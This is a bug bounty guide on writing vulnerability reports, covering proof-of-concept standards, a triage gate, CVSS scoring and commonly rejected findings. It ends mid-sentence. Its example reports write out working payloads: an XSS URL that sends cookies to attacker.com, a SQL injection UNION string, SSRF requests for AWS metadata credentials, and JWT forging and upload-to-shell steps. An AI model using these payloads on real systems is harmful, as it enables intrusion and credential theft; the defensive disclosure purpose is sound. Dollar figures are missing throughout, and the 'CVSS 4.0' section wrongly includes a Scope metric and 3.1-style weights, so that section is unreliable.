# Reporting Rules

Report quality directly impacts payout. Triagers are busy. Make their job easy.

A well-written report is the difference between a  payout and a ,000+ payout for the exact same
finding. Triagers make split-second decisions based on clarity, confidence, and demonstrated impact.
Every rule below exists because someone lost a payout ignoring it.

---

## 1. NEVER USE THEORETICAL LANGUAGE

This is the single most common reason reports get downgraded or closed. Triagers see "could" and
immediately know you didn't actually test it. Every weasel word in your report signals to the
triager: "This researcher is guessing."

### The Rule

NEVER write:    "could potentially allow an attacker to"
NEVER write:    "may allow an attacker to"
NEVER write:    "might be possible"
NEVER write:    "could lead to"
NEVER write:    "could be chained with X to cause Y"
NEVER write:    "might be exploited by"
NEVER write:    "in theory, an attacker"
NEVER write:    "this may result in"
NEVER write:    "this might allow"
NEVER write:    "if an attacker were to"
NEVER write:    "this has the potential to"
NEVER write:    "one could imagine"

ALWAYS write:   "An attacker can [exact action] by [exact method]"

If you can't write a concrete statement -> you don't have a bug yet. Go back and actually exploit it.

### Before/After Examples Across Bug Classes

**IDOR:**
BAD:  "An attacker could potentially access other users' private data by changing the ID parameter."
GOOD: "An attacker can read any user's private medical records by sending GET /api/v2/records/1337 with Account A's session cookie. The response returns Account B's full name, diagnosis, and prescription history. See PoC screenshot showing Account A's cookie in the request and Account B's name in the response."

BAD:  "IDOR in invoice endpoint may allow access to other invoices."
GOOD: "An attacker with a free-tier account can read 1,842,536 invoice records by iterating /api/invoices/{id} from 1 to 1842536. Each response contains customer name, address, credit card last-4, and amount. The endpoint returns full data with no authorization check."

**XSS:**
BAD:  "Reflected XSS might be possible in the search parameter."
GOOD: "An attacker can execute arbitrary JavaScript in any victim's browser by sending them https://target.com/search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>. The q parameter is reflected without sanitization inside a <script> context with no CSP. When a victim visits the link, their session cookie is sent to attacker.com. PoC: Burp proxy log shows incoming request with document.cookie contents."

BAD:  "Stored XSS could be used to steal admin cookies."
GOOD: "An attacker can register with username that includes an XSS payload, and when the admin views the user management page at /admin/users, every registered user's username is rendered unsanitized in a <td> element. The admin's session cookie is exfiltrated to attacker.com. See video PoC: admin browser -> visits user list -> attacker machine receives cookie via Burp Collaborator."

**SSRF:**
BAD:  "The image upload feature may be vulnerable to SSRF."
GOOD: "An attacker can scan internal network services by sending POST /api/upload with {\"image_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\"}. The server fetches the URL and returns the AWS IAM credentials in the error message: {\"error\": \"Failed to process: <AccessKeyId>AKIAIOSFODNN7EXAMPLE</AccessKeyId>...\"}. See PoC screenshot showing AWS keys in the response body."

BAD:  "SSRF could be used to access internal services."
GOOD: "An attacker can read internal HTTP services by using the PDF export feature at /api/export/pdf?url=http://internal-admin-dashboard:8080/. The server fetches internal-admin-dashboard:8080 and the resulting HTML is included in the PDF output. PoC: Request returns a PDF containing the internal admin dashboard showing 47 active database connections, internal IPs, and service health statuses."

**SQLi:**
BAD:  "The login parameter might be vulnerable to SQL injection."
GOOD: "An attacker can extract the entire users table by sending POST /api/login with username=admin' OR '1'='1' UNION SELECT username,password,email FROM users-- and password=anything. The response returns all 50,247 user records including bcrypt password hashes and email addresses. PoC: SQLMap output showing 50,247 rows extracted from users table in 14 seconds."

**Auth Bypass:**
BAD:  "The admin panel might be accessible without authentication."
GOOD: "An attacker can access the admin panel by navigating directly to /admin/dashboard without any session cookie. The server returns the full admin dashboard HTML with user management, payment logs, and site configuration. No redirect to login occurs. PoC: Incognito window -> navigate to /admin/dashboard -> full admin panel loads with no auth prompt."

**Business Logic:**
BAD:  "It might be possible to apply multiple discount codes."
GOOD: "An attacker can apply unlimited discount codes on a single order, stacking them to achieve 100% discount. Steps: (1) Add item to cart (). (2) Apply code WELCOME10 -> price = . (3) Apply code FRIEND10 -> price = . (4) Repeat codes NEW10, SAVE20, PROMO30 sequentially. After applying 6 codes, price = . The cart API at POST /api/cart/apply-coupon does not track which codes have been used. See Burp sequence showing 6 codes applied with final ."

**File Upload:**
BAD:  "File upload might allow an attacker to upload malicious files."
GOOD: "An attacker can achieve remote code execution on the server by uploading shell.aspx;.jpg to /api/profile/avatar. The server validates the extension ends with .jpg but the IIS handler parses shell.aspx;.jpg as ASP.NET. Browsing to /uploads/avatars/shell.aspx;.jpg executes the uploaded ASP.NET code and returns nt authority\system. PoC: screenshot showing whoami output in browser."

**Race Condition:**
BAD:  "A race condition may exist in the checkout process."
GOOD: "An attacker can purchase 100 items while being charged for only 1 item by sending 100 concurrent POST /api/checkout requests using the same single-item cart token. The server processes all 100 requests before the inventory decrement completes, resulting in 100 items shipped at .99 total. PoC: Turbo Intruder script with 100 concurrent threads and the response confirming 100 orders created at .10 each."

**JWT Attacks:**
BAD:  "The JWT implementation might be vulnerable to algorithm confusion."
GOOD: "An attacker can forge arbitrary user identities by modifying the JWT alg header from RS256 to HS256, then signing with the public key (available at /.well-known/jwks.json). The server accepts alg: HS256 with the public key as the HMAC secret. Steps: (1) Retrieve public key from /.well-known/jwks.json. (2) Create new JWT with {\"alg\":\"HS256\",\"typ\":\"JWT\"} and payload {\"sub\":\"admin\",\"role\":\"administrator\"}. (3) Sign with the public key as HMAC secret. (4) Use this token on any endpoint -> server responds as admin. PoC: Modified JWT in Burp request with 200 response showing admin panel."

**Prototype Pollution:**
BAD:  "The application might be vulnerable to prototype pollution."
GOOD: "An attacker can achieve DOM-based XSS by sending a JSON payload with __proto__ to POST /api/settings. The server uses lodash.merge({}, req.body) without sanitization, polluting Object.prototype.isAdmin. When any user visits /admin, the check if (user.isAdmin) evaluates to true because the polluted prototype returns true for all objects. PoC: Create account -> send {\"__proto__\":{\"isAdmin\":true}} -> visit /admin -> admin panel loads."

### The "Test It or Shut Up" Principle

Every theoretical statement in a report should trigger the following self-review:

| Weasel Phrase | Self-Review Question |
|---|---|
| "could potentially" | Did you actually try it? If yes, write what happened. |
| "may allow" | Did it allow it? Show the result. |
| "might be possible" | Is it possible? Prove it with a PoC. |
| "could lead to" | What did it lead to when you tested? |
| "could be chained" | Did you chain it? Show the working chain. |
| "in theory" | Theory is irrelevant. What's the practice? |
| "one could imagine" | Stop imagining. Start testing. |
| "this may result in" | What did it result in? |
| "potentially dangerous" | Either it's dangerous or it is not. |
| "if an attacker..." | You are the attacker. What did you achieve? |
| "has the potential to" | Unlock the potential. Prove it. |

### The Impact Language Cheat Sheet

Use these replacements to eliminate weasel words from all reports:

| Instead of | Write |
|---|---|
| could potentially access | can access |
| may be able to read | can read |
| might be vulnerable to | is vulnerable to |
| could be exploited | is exploitable |
| may result in information disclosure | discloses [exact data] |
| could lead to account takeover | [demonstrated] account takeover |
| might allow privilege escalation | demonstrates privilege escalation to [role] |
| could be chained with | chained with [X] to achieve [Y] [verified in PoC] |
| potentially sensitive | [confirmed] sensitive data |
| may be at risk of | is confirmed to |


---

## 2. RUN 7-QUESTION GATE BEFORE WRITING

Every finding must pass all 7 questions before spending time on a report.

One NO = kill it immediately. N/A hurts your validity ratio more than missing a bug.
Triagers and program managers track your N/A rate. A high N/A rate means future reports
get slower triage, lower trust, and sometimes automatic closure.

### Question 1: Is this actually exploitable from an external attacker's perspective?

**What this means:** Can someone who is not an employee, not on the VPN, and not already inside
the network trigger this? If exploitation requires the attacker to already have internal network
access, a specific browser version, or prerequisites the attacker would not reasonably have,
it is not externally exploitable.

**Common failure modes:**
- Found a debug endpoint on staging that requires VPN access
- Host header injection that only works when you are on the same subnet
- SQLi that requires being on the internal network
- Feature that only exists in the admin panel and requires admin login

**Real example of a kill:** Researcher found a SQL injection in a WordPress admin plugin.
Passed Questions 2-7 but failed Q1 because the plugin required admin authentication.
Triaged as N/A -- wasted 3 hours on a report.

**Self-diagnostic:**
- Can I trigger this from a clean, non-corporate laptop on public WiFi?
- Do I need any cookies, headers, or tokens that an external attacker would not have?
- Is the affected endpoint reachable without authentication?
- If auth is required, what level? Can an attacker create an account?

### Question 2: Does this affect a meaningful number of users?

**What this means:** A bug that affects 5 users out of 10 million is informational at best.
The impact must scale or affect a critical subset (admins, high-value users).

**Common failure modes:**
- Stored XSS that only triggers on your own profile page (only you see it)
- IDOR on an endpoint that is only used during onboarding (affects 0.01% of users)
- Rate limiting bypass that is already rate limited to 100 requests/second

**When it still passes despite small user base:**
- The affected users are administrators
- The affected users are high-value (enterprise, VIP)
- The data accessed is sensitive enough that even 1 user's data matters (PII, medical, financial)
- The bug lets you pivot to other users (e.g., admin account -> all users)

**Real example of a kill:** Researcher found an IDOR in a "delete account" endpoint that let
User A delete User B's account. But the endpoint GUID was only shared in onboarding emails
that expired after 24 hours. Only ~50 accounts were affected, and the feature was deprecated.
Triaged as N/A.

### Question 3: Can you write a complete, non-theoretical PoC right now?

**What this means:** Not "I think I can reproduce it" or "the steps are complicated."
You must be able to reproduce it on demand, capture evidence, and write step-by-step
instructions that another person can follow.

**Common failure modes:**
- "It worked once but I cannot reproduce it" -- then it is a Heisenbug, not a finding
- "The steps are: try various payloads" -- that is a methodology, not a PoC
- "The bug depends on specific timing" -- either reproduce it or document the timing
- Flaky network conditions that you cannot control

**Self-diagnostic:**
- Can I reproduce this 3 times in a row right now?
- Can I write the exact HTTP request (copy from Burp)?
- Can someone follow my steps and see the same result?
- Do I have screenshots/videos of each step?

### Question 4: Is this truly a security boundary violation, not intended behavior?

**What this means:** Just because a feature surprised you does not mean it is a bug.
Programs have legitimate features that look like vulnerabilities.

**Common failure modes:**
- Reporting the "forgot password" rate limit as a bug -- programs intentionally allow
  multiple attempts for UX reasons (but should have backend rate limiting)
- "I can see my own data" -- that is not IDOR, that is intended
- "The API returns full objects" -- that might be the intended design
- "I can delete my own account" -- check if it is supposed to work that way

**Real example of a kill:** Researcher reported that they could list all files they uploaded
by iterating file IDs. The program responded: "That is intended -- uploads are meant to be
accessible by their owner, and the ID is a UUID." The researcher assumed UUID iteration
was impossible, but the program had other protections per-user.

**Self-diagnostic:**
- Did I test with the intended behavior in mind?
- Can I find documentation or API specs that describe this behavior?
- Does the program have a reason to allow this?
- Is there any authorization check happening that I am not seeing?

### Question 5: Can you clearly articulate the business impact?

**What this means:** Not just "this is a security issue" but "this means [X] dollars of
risk / [Y] users' data exposed / [Z] regulatory violations." Triagers do not care about
CVSS numbers in isolation -- they care about what the bug means for the business.

**Common failure modes:**
- "This is a critical vulnerability" without explaining why
- Technical impact only ("attacker can read database") without business translation
- Assuming the triager will connect the dots

**Passing examples:**
- "Breach of 2M user records including PII -> GDPR fines of up to 4% of global revenue"
- "Full account takeover of any user -> fraud losses, user trust damage, support costs"
- "Internal network access from SSRF -> lateral movement to production databases"
- "Admin account creation -> attacker can modify site content, steal payment data"

### Question 6: Is the bug located in a scope asset?

**What this means:** The endpoint, domain, or functionality must be explicitly in scope.
Wildcard scope still requires specific matching.

**Common failure modes:**
- Finding bugs on acquisitions.example.com which is explicitly OOS even under wildcard
- Reporting SSRF on a third-party service the target uses (e.g., Stripe, AWS)
- Third-party integrations that the program did not build
- Bug on staging that is explicitly excluded
- Bug on expired subdomains no longer owned by the program

**Real example of a kill:** Researcher found a critical bug on vendor-portal.example.com.
The program's scope had *.example.com. However, the vendor portal was a third-party
SaaS (Zendesk) that example.com branded. Not in scope, not owned by them. N/A.

**Self-diagnostic:**
- Copy the full URL and verify it matches the scope wildcard exactly
- Is this a first-party or third-party service?
- Check the scope description for any exclusions or caveats
- If it is an acquired company, check if the acquisition is recent enough to be in scope

### Question 7: Has this finding been disclosed or reported before?

**What this means:** If it is public knowledge (HackerOne disclosed reports, blog posts,
conference talks, GitHub issues, security advisories), it is N/A. Programs do not pay for
known bugs.

**Common failure modes:**
- Finding a CVE that has been public for 6 months
- Reporting an issue the program fixed last year
- Finding a bug described in a blog post from 2023
- The program's changelog mentions the fix
- GitHub Actions workflow is intentionally designed that way

**Self-diagnostic:**
- Search HackerOne Hacktivity for the program and bug type
- Search program's changelog/release notes
- Search GitHub issues for the program
- Search for CVEs matching the technology stack + bug type
- Check disclosed reports on Bugcrowd/Intigriti
- Check the program's known issues/acknowledged page
- Google: site:hackerone.com [program] [bugtype]
- Search for blog posts about the technology

### Gate Decision Flowchart

Q1: Externally exploitable?
+-- NO -> KILL (document as internal/extended recon)
+-- YES -> Q2

Q2: Affects meaningful users?
+-- NO -> KILL (document as low-severity informational)
+-- YES -> Q3

Q3: Complete PoC exists?
+-- NO -> Go back and find the PoC. Do not report without it.
+-- YES -> Q4

Q4: True security boundary violation?
+-- NO -> KILL (ask in forum if you are unsure)
+-- YES -> Q5

Q5: Clear business impact?
+-- NO -> Think harder about impact. If still no -> KILL.
+-- YES -> Q6

Q6: In scope?
+-- NO -> KILL (check scope again more carefully)
+-- YES -> Q7

Q7: Already reported/disclosed?
+-- YES -> KILL (find a different angle)
+-- NO -> WRITE THE REPORT

### What to Do With Killed Findings

Just because a finding fails the 7-question gate does not mean it is worthless:

- **Document for later:** Save the finding in your local notes. A change in scope,
  a new endpoint, or a chain primitive may make it viable in the future.
- **Ask the community:** If you are unsure about Q4 (intended behavior), ask in the
  program's forum or community channels without revealing the finding details.
- **Upgrade path:** Some killed findings are one step away from passing. For example,
  "self-XSS" (fails Q1) becomes "stored XSS hitting admin" (passes all 7) if you
  find a stored vector.
- **Platform-specific notes:** Some programs do not want you asking in forums.
  Check the program's disclosure policy first.


---

## 3. ALWAYS INCLUDE PROOF OF CONCEPT

A "technically possible" finding without PoC is an Informational at best.

Triagers process dozens of reports per day. They will not "trust you" that a bug
exists. Your PoC is your evidence. Without it, your report is a guess.

### PoC Standards Per Bug Class

**IDOR / BOLA:**
- REQUIRED: Show the victim's actual data in the response body
- NOT ENOUGH: A 200 OK response (that just means the endpoint exists)
- NOT ENOUGH: A response that says "access denied" (that means authorization is working)
- Screenshot must show: Request with Account A's session token + Response with Account B's
  private data (name, email, PII, financial data, etc.)
- Video PoC: Show logging in as Account A, opening Burp, modifying the request, and seeing
  Account B's data
- For object enumeration: Show at least 5 consecutive IDs returning different users' data

Good PoC for IDOR:
  Request (Account A's session cookie):
  GET /api/v2/users/4242/profile HTTP/1.1
  Cookie: session=ACCOUNT_A_SESSION

  Response:
  HTTP/1.1 200 OK
  {"id": 4242, "name": "Victim Name", "email": "victim@test.com",
   "ssn": "***-**-1234", "phone": "+1-555-0100", "address": "123 Victim St"}

  Note: Account A cannot access Account B's data through the UI. The API directly
  returns Account B's PII when Account A's session is used with Account B's ID.

Bad PoC for IDOR:
  I tried /api/v2/users/4242 and got a 200 response. (No data shown.)

**XSS:**
- REQUIRED: Show actual cookie exfiltration or equivalent impact
- NOT ENOUGH: alert(document.domain) -- this does not prove anything to a triager
- NOT ENOUGH: Just the payload reflecting in the response -- reflection alone is not XSS
- For stored XSS: Show the payload persisting and triggering when another user views the page
- For reflected XSS: Show the full attack URL + cookie arriving at your server

Good PoC for Reflected XSS:
  1. Start Burp Collaborator or requestbin
  2. Craft the malicious URL with XSS payload that exfiltrates document.cookie
  3. Visit the URL in an authenticated browser session
  4. Burp Collaborator receives the cookie

Good PoC for Stored XSS:
  1. Register as user "attacker"
  2. Set profile bio to include XSS payload that sends cookie to attacker server
  3. Log in as admin (Account B) and navigate to /admin/users
  4. Attacker server receives admin session cookie
  5. PoC Video: Full flow from account creation to admin dashboard access with stolen cookie

**SSRF:**
- REQUIRED: Show the response from the internal service
- NOT ENOUGH: A DNS callback (DNS alone does not prove useful SSRF)
- NOT ENOUGH: A timing delay (too dependent on network conditions)
- For cloud metadata: Show the actual IAM credentials returned
- For internal scanning: Show at least one useful internal response

Good PoC for SSRF to Cloud Metadata:
  1. Craft request to POST /api/profile/avatar with URL pointing to AWS metadata service
  2. Server responds with IAM role name
  3. Fetch role credentials from metadata service
  4. Server responds with AccessKeyId, SecretAccessKey, and Token

Good PoC for SSRF to Internal Service:
  1. POST /proxy?url=http://127.0.0.1:9200/_cat/indices
  2. Response returns Elasticsearch index listing with document counts

**SQLi:**
- REQUIRED: Show actual database content beyond the error message
- NOT ENOUGH: An error message alone (that is information disclosure, not SQLi exploitation)
- NOT ENOUGH: A timing-based detection without data extraction

Good PoC for SQLi:
  Using SQLMap or manual exploitation, extract actual data and provide sample rows
  including username, password hash, email, and role for at least 5 users.
  Attach SQLMap output showing total rows extracted.

**Auth Bypass / Privilege Escalation:**
- REQUIRED: Show the unauthorized action succeeding
- NOT ENOUGH: "I got a 200 instead of 401" -- show what the 200 actually returned
- Show the difference between authenticated and unauthenticated requests

**File Upload:**
- REQUIRED: Show the uploaded file being accessed and executed
- NOT ENOUGH: "The file was uploaded" -- show what happens when you access it
- PoC must show command output for RCE findings

**SSTI:**
- REQUIRED: Show template evaluation (arithmetic or command output)
- NOT ENOUGH: The string reflected back without evaluation
- Show {{7*7}} renders as 49 before escalating to RCE

**Race Condition:**
- REQUIRED: Show the confirmed race window and the successful exploit
- Provide the script/tool used to exploit it (Turbo Intruder, Python, etc.)
- Show at least 5 successful exploitations out of 10 attempts

### Screenshot Requirements

Every screenshot must have:
1. **URL bar visible** -- shows you are on the target domain (not localhost)
2. **Full browser window** -- not a cropped snippet that could be faked
3. **Developer Tools / Burp visible** -- shows the actual request/response
4. **Timestamps** -- shows when the PoC was performed
5. **Account identifiers** -- shows which account is used (mask sensitive data)

Technical requirements:
- PNG format (lossless, universal)
- Minimum 1280x720 resolution
- No redaction of evidence details (redact only: cookies, passwords, tokens)
- Annotated with arrows/circles showing the key finding
- Numbered to match PoC steps

### Video Proof Standards

Video proofs are required for:
- Complex multi-step exploits
- Race conditions
- CSRF chains requiring user interaction
- Timing-sensitive exploits

Video requirements:
- 1080p maximum (smaller files, faster triage)
- Screen recording with mouse cursor visible
- Show the browser URL bar at all times
- Include audio narration explaining each step
- Max 60 seconds (triagers will not watch longer)
- Submit as MP4 or embed as GIF for key moments
- Start video: "This is proof of concept for [finding title]"
- End video: Show success state clearly

### HAR File Standards

When attaching HAR files:
- Export from Chrome DevTools: Network tab -> Export HAR
- Sanitize cookies before submitting (remove Cookie and Set-Cookie headers)
- Do not modify the request/response bodies (that is the evidence)
- Name files: [bug_class]_[target]_[date].har
- Max file size: 50MB (check platform limits)

### What NOT to Include as PoC

- Screenshots of source code showing a vulnerability (prove exploitation, not existence)
- Responses that say "it would be vulnerable if..." (theoretical again)
- Just the request without the response
- Response without the request
- Non-deterministic evidence ("it worked once")
- Evidence from a local test environment without confirming production mirror


---

## 4. CVSS MUST MATCH ACTUAL IMPACT

Do not claim Critical for a Medium bug. Triagers trust you less for every overclaim.
Do not claim Medium for a Critical -- you are leaving money on the table.

CVSS scoring is a language that triagers speak fluently. Scoring mistakes signal
that you do not understand the severity of what you found. Over-scoring makes you
look like you are padding for money. Under-scoring signals you do not understand impact.

### CVSS 4.0 Complete Scoring Reference

CVSS 4.0 is the current standard (adopted 2024). Learn it.

**Attack Vector (AV):**
- Network (N): Exploitable over the internet -- default for web bugs -- score: 0.85
- Adjacent (A): Same network segment -- SSRF accessing internal services -- score: 0.62
- Local (L): Requires local access or shell -- score: 0.55
- Physical (P): Requires physical access -- score: 0.20

**Attack Complexity (AC):**
- Low (L): No special conditions -- standard exploit -- score: 0.77
- High (H): Requires conditions, race window, specific config -- score: 0.44

**Attack Requirements (AT):**
- None (N): No prerequisites -- score: 0.85
- Present (P): Requires specific config, user interaction, etc. -- score: 0.44

**Privileges Required (PR):**
- None (N): No authentication needed -- score: 0.85
- Low (L): Basic user account -- score: 0.62 (or 0.68 if scope changed)
- High (H): Admin privileges required -- score: 0.27 (or 0.50 if scope changed)

**User Interaction (UI):**
- None (N): No user action needed -- score: 0.85
- Active (A): Victim must click/visit/interact -- score: 0.62
- Passive (P): Victim must be logged in but no active interaction -- score: 0.44

**Scope (S):**
- Unchanged (U): Vulnerability affects the same authority -- score: varies
- Changed (C): Vulnerability impacts a different scope -- score: varies, 1.0 multiplier

**Confidentiality (C):**
- None (N): No data disclosure -- 0.00
- Low (L): Limited disclosure, metadata only -- 0.25
- High (H): Full disclosure -- 0.56

**Integrity (I):**
- None (N): No modification -- 0.00
- Low (L): Limited modification possible -- 0.25
- High (H): Full system/account modification -- 0.56

**Availability (A):**
- None (N): No availability impact -- 0.00
- Low (L): Degraded performance -- 0.25
- High (H): Full denial of service -- 0.56

#### 30+ Common CVSS 4.0 Scoring Patterns

| Bug Type | AV | AC | AT | PR | UI | S | C | I | A | Score | Severity |
| IDOR read public-ish data | N | L | N | L | N | U | L | N | N | 5.9 | Medium |
| IDOR read PII | N | L | N | L | N | U | H | N | N | 7.1 | High |
| IDOR read financial data | N | L | N | L | N | U | H | N | N | 7.1 | High |
| IDOR write (modify others' data) | N | L | N | L | N | U | N | H | N | 7.1 | High |
| IDOR account takeover | N | L | N | L | P | U | H | H | H | 8.3 | High |
| Auth bypass -> user data | N | L | N | N | N | U | H | H | N | 9.3 | Critical |
| Auth bypass -> admin | N | L | N | N | N | C | H | H | H | 10.0 | Critical |
| Auth bypass -> RCE | N | L | N | N | N | C | H | H | H | 10.0 | Critical |
| SQLi extract entire DB | N | L | N | N | N | U | H | H | N | 9.3 | Critical |
| SQLi limited data | N | L | N | N | N | U | H | N | N | 7.5 | High |
| Reflected XSS | N | L | N | N | A | U | H | N | N | 6.3 | Medium |
| Stored XSS -> user | N | L | N | N | A | U | H | L | N | 6.9 | Medium |
| Stored XSS -> admin | N | L | N | L | P | C | H | H | H | 9.1 | Critical |
| Blind XSS to admin | N | H | N | N | P | C | H | H | H | 8.2 | High |
| SSRF -> cloud metadata | N | L | N | N | N | C | H | H | H | 10.0 | Critical |
| SSRF -> internal service read | N | L | N | N | N | U | H | N | N | 7.5 | High |
| SSRF -> internal service write | N | L | N | N | N | U | N | H | H | 8.1 | High |
| SSRF DNS only | N | L | N | N | N | U | N | N | N | 0.0 | None |
| File upload limited scope | N | L | N | N | A | U | N | L | N | 4.3 | Medium |
| File upload -> RCE | N | L | N | N | N | C | H | H | H | 10.0 | Critical |
| Race condition -> financial | N | H | N | L | N | U | N | H | N | 6.8 | Medium |
| Race condition -> privilege | N | H | N | L | N | U | H | L | N | 6.8 | Medium |
| Prototype pollution -> XSS | N | L | P | N | A | U | H | N | N | 5.3 | Medium |
| Prototype pollution -> RCE | N | L | P | N | N | C | H | H | H | 9.1 | Critical |
| JWT alg none | N | L | N | N | N | U | H | H | N | 9.3 | Critical |
| Open redirect alone | N | L | P | N | A | U | N | N | N | 0.0 | None |
| SSTI -> RCE | N | L | N | N | N | C | H | H | H | 10.0 | Critical |
| SAML signature stripping | N | L | N | N | N | C | H | H | H | 10.0 | Critical |
| Deserialization -> RCE | N | H | N | N | N | C | H | H | H | 9.1 | Critical |
| Broken rate limiting (auth) | N | L | N | N | N | U | H | H | H | 9.3 | Critical |
| Broken rate limiting (info) | N | L | N | N | N | U | N | N | N | 5.3 | Medium |
| Subdomain takeover | N | L | N | N | P | C | H | H | N | 8.3 | High |
| Cache poisoning -> XSS | N | L | N | N | N | U | H | L | N | 7.2 | High |

### CVSS 3.1 Reference (Still Used by Many Programs)

| Bug Type | AV | AC | PR | UI | S | C | I | A | Score | Severity |
| XSS reflected | N | L | N | R | U | L | N | N | 6.1 | Medium |
| XSS stored | N | L | L | R | C | H | H | N | 8.2 | High |
| XSS stored to admin | N | L | L | R | C | H | H | H | 9.0 | Critical |
| SQLi | N | L | N | N | U | H | H | H | 9.8 | Critical |
| SSRF metadata | N | L | N | N | C | H | H | H | 10.0 | Critical |
| SSRF internal | N | L | N | N | U | H | L | N | 7.5 | High |
| IDOR PII | N | L | L | N | U | H | N | N | 6.5 | Medium |
| IDOR financial | N | L | L | N | U | L | N | N | 5.0 | Medium |
| Auth bypass admin | N | L | N | N | C | H | H | H | 10.0 | Critical |
| Auth bypass user | N | L | N | N | U | H | H | N | 9.1 | Critical |
| Race condition | N | H | N | H | U | L | L | L | 4.1 | Medium |
| File upload RCE | N | L | N | N | C | H | H | H | 10.0 | Critical |
| Open redirect | N | L | N | R | U | N | N | N | 4.7 | Medium |
| Open redirect (phishing) | N | L | N | R | C | N | L | N | 4.1 | Medium |
| Prototype pollution | N | L | N | R | U | H | L | N | 6.1 | Medium |
| CORS wildcard creds | N | L | N | N | U | H | N | N | 7.5 | High |
| JWT none | N | L | L | N | C | H | H | H | 9.1 | Critical |
| Subdomain takeover | N | L | L | N | C | H | H | N | 8.1 | High |
| SSTI RCE | N | L | L | N | C | H | H | H | 9.1 | Critical |
| Insecure direct object | N | L | L | N | U | H | H | N | 8.1 | High |
| CSRF account change | N | L | N | R | U | N | H | N | 6.5 | Medium |
| Cache poison | N | L | N | N | U | H | L | N | 6.5 | Medium |
| DoS simple | N | L | N | N | U | N | N | H | 7.5 | High |
| Host header injection | N | L | N | N | U | L | L | N | 6.1 | Medium |
| Path traversal read | N | L | N | N | U | H | N | N | 7.5 | High |
| Directory listing | N | L | L | N | U | H | N | N | 6.5 | Medium |

### Overclaiming Consequences

When you overclaim severity:
1. **Triager skepticism:** Once you claim Critical for a Medium, triager assumes all your
   future findings are inflated. Your credibility is damaged.
2. **Program blacklisting:** Programs track researchers. Inflated scores = waste of their time.
3. **Disputes waste time:** You spend energy arguing a score you cannot defend.
4. **N/A rate increase:** If you claim Critical and triager sees Medium, they may N/A rather
   than downgrade (some platforms count this as N/A).
5. **Bounty expectations:** If you claim Critical and it is downgraded, the lower bounty
   feels like a loss even though it is appropriate.

### Underclaiming Consequences

When you underclaim severity:
1. **Left money on the table:** A Critical that you scored as Medium pays Medium at best.
   Programs pay based on the triager's assessment, but your score frames their thinking.
2. **Priority downgrade:** Lower severity = slower triage. Your PoC expires, the bug gets
   fixed silently, and you get nothing.
3. **Missed bounties:** Some programs have automatic payout tiers based on severity.
   Under-scoring means you get the lower tier.
4. **Chain opportunities missed:** A "Medium" might not get attention, but if it chains
   to Critical, you needed to communicate that.

### How to Score Correctly Every Time

1. **Use a calculator:** https://www.first.org/cvss/calculator/4.0 or
   https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
2. **Do not estimate -- test:** Not sure if PR is None or Low? Test without authentication.
3. **Scope changes:** If the bug is in a frontend API but impacts backend admin, that is
   a scope change (C), which significantly increases severity.
4. **Get peer review:** Ask another researcher to score your bug before submitting.
5. **Document your choices:** In the report, include a brief rationale for each metric.
   "AV:N because the endpoint is internet-accessible. PR:L because a free account is required."
6. **When in doubt, round down:** It is better to score Medium and have the triager say
   "actually this is High" than to score High and have them say "no, this is Medium."


---

## 5. NEVER SUBMIT FROM THE ALWAYS-REJECTED LIST

These are always N/A. Never submit them standalone.

But many of these can become valid when chained. The key is to chain them into
something that actually exploits a security boundary. Below each item:
- Why it is rejected alone
- The chain condition that makes it a bug
- Real examples of when these became paid findings

### 1. Missing CSP / HSTS / X-Frame-Options Headers

**Why rejected alone:** Missing security headers are a policy issue, not a vulnerability.
They do not directly expose data or allow exploitation.

**Chain condition:** CSP missing + stored XSS = exploitable. HSTS missing + MITM on
first visit. XFO missing + iframe clickjacking of sensitive action.

**Real example:** Researcher found missing CSP + stored XSS in comment field. CSP was the
only thing preventing script execution. Combined: ,000. CSP alone: N/A.

### 2. GraphQL Introspection Alone

**Why rejected alone:** Introspection is just documentation. Every public API has
documentation. It is not a bug to see it.

**Chain condition:** Introspection + query without auth = IDOR/BOLA via GraphQL.
Introspection + field that returns sensitive data = info disclosure.

**Real example:** Researcher found introspection enabled, then discovered a
getAllUsers query that returned all 2M user records without auth. Chain: ,500.
Introspection alone: N/A.

### 3. Self-XSS (XSS That Only Triggers on Your Own Input)

**Why rejected alone:** You are attacking yourself. No victim impact.

**Chain condition:** Self-XSS + CSRF = stored XSS hitting other users. Self-XSS via
profile field that other users see (that is stored XSS, not self-XSS).

**Real example:** Researcher found XSS in their own profile bio. Alone: N/A. But when
they realized the bio was rendered on the public profile page that ANY visitor sees,
it became stored XSS -- ,500.

### 4. Open Redirect Alone

**Why rejected alone:** Open redirect by itself does not steal data. It is a phishing
primitive, but programs expect you to demonstrate the full phishing chain or account
for why it is a security boundary violation.

**Chain condition:** Open redirect + OAuth redirect_uri validation bypass = token theft.
Open redirect to a page that sets auth cookies over HTTP. Open redirect + browser vuln.

**Real example:** Researcher found open redirect on login page, then discovered that
OAuth redirect_uri was not validated -- they could redirect the OAuth flow to their
own domain, steal the auth code, and take over the user's account. Chain: ,500.
Open redirect alone: N/A.

### 5. SSRF That Only Returns DNS Callbacks

**Why rejected alone:** DNS callbacks alone do not demonstrate impact. You have not
accessed any internal service or data.

**Chain condition:** SSRF DNS + internal service discovery on a different port = actual
SSRF. SSRF that confirms internal host existence + other bug that requires knowledge
of internal topology.

**Real example:** Researcher had SSRF that only did DNS + timing-based port scanning.
They found a Redis instance on port 6379 internally, then used the SSRF to interact
with Redis (Gopher protocol) to achieve RCE. Chain: ,000.

### 6. Logout CSRF

**Why rejected alone:** This is universally accepted as a non-issue. An attacker
can already log users out by other means (DoS, account lockout).

**Chain condition:** Logout CSRF + session fixation = pre-session takeover. Logout CSRF
on multi-factor auth flow = MFA fatigue bypass.

### 7. Missing Cookie Flags Alone (Secure, HttpOnly, SameSite)

**Why rejected alone:** Missing cookie flags do not directly expose data. They make
other attacks easier but are not vulnerabilities themselves.

**Chain condition:** No HttpOnly + stored XSS = cookie theft that would be blocked by
HttpOnly. No Secure + MITM position = cookie interception.

**Real example:** Researcher found a session cookie without HttpOnly and without Secure
flags. Alone: N/A. But they also found a stored XSS in the same session scope. The
missing flags made the XSS -> cookie theft chain work. Combined: ,000.

### 8. Rate Limiting Missing (or Bypass) on Non-Critical Forms

**Why rejected alone:** Programs consider rate limiting a defense-in-depth measure.
They expect you to demonstrate actual harm from unlimited requests.

**Chain condition:** No rate limit on login + password spray = account takeover.
No rate limit on OTP verification + enumeration of accounts = MFA bypass.

**Real example:** Researcher found no rate limit on the 2FA code entry. They brute-forced
